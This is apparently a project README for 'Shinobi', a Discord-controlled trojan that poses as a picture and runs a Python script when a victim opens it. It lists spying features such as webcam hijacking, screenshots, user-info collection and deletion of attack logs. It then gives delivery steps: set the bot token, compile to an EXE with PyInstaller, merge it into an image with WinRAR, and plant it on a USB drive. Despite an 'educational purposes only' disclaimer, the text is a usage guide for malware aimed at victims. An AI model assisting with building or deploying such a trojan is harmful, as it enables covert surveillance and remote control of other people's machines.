# Shinobi 
_Discord trojan_
created by *jonathan jaquias*, *unamay labial*, *jackielyn luna*, *euri camino* 

_**disclaimer**_: **For educational purposes only**

Shinobi is a trojan that disguises itself as a normal picture, but when a victim opens the image, it will run a **python script** in the background, giving access to the attacker's machine. The attacker or attackers can then send a command via Discord, and it will execute on the **victim's machine.**

# Shinobi can do the following:
- Lock user's machine
- Get user info
- Play background music to victim's machine
- Hijack victim's webcam
- Take a screenshot
- Check for open application then close it
- List all application victim's have
- Troll [just for fun]
- Delete all logs of the attack

# How to use shinobi
* Shinobi is plug-and play trojan software, which basically means all you need to do is send the payload or image to the victim, and the script will take over from there. Once the script is triggered, you should see a bot that will be online on your Discord server.

# How to use shinobi [for developers]
- Run _**pip install -r requirements.txt**_ to make sure every packages is installed
```bash
pip install -r requirements.txt
```
![Capture](https://github.com/p3nut-ai/shinobi_finals/assets/49468484/34a2a9f5-934b-42b7-a4b1-9fb4dccaf676)

- open main.py to edit **Discord bot token** and **Server Channel ID** or add your own command.
- once finished make sure to convert the python file to an **executable EXE**

  #Convert py to exe
  - Install PyInstaller package
    ```bash
    pip install pyinstaller 
    ```
  - Once done then convert the py to exe by executing this command.
     ```bash
    pyinstaller [your python file].py --onefile
    ```
- Once we have an executable Python file, we can then merge the image we want into that Python file by using Winrar.

_After finishing all the requirements, it should be good to go. You can then add it to an evil flash drive that will run a bat file when plugged into a PC. [for the sake of demonstration]_

# Limitation of our program:
- We don't steal a token in local databse in your chrome (like your discord token)
- We don't install a **backdoor or any persistent backdoor** it is a one time code execution
- We don't add or install any other software program to your machine
- We don't run any serious malicious activity aside from the list we mentioned earlier.
